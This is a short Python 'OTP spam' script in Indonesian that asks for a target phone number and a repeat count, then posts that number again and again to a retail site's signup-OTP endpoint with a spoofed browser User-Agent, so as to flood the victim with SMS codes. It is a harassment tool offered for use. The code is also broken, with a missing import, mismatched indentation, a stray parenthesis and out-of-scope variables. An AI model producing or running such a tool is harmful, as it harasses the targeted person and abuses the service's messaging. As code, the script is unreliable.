import sys,json,requests,os

def main():
	os.system('clear')
	sleep (1)
	os.system('figlet Spam by Ahmad')
	sleep (1)
	banner = """
	
	[•] =======================[•]
	     Author : Arp
    [•] =======================[•]"""
    sleep (1)
    print(banner)
    sleep (1)
    tar = input("Masukan Nomor Target : ")
    jum = input("Masukan Jumlah Spam : ")
    
head = {
"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
"Referer": "https://www.mapclub.com/en/user/signup",
"Host": "cmsapi.mapclub.com",
}

dat = {
'phone' : tar
}


for x in range(jum)):
        leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'eror' in leosureo:
        	print('masukan Nomor yang benar')
        else:
        	print('Spam Berhasil')
        
main()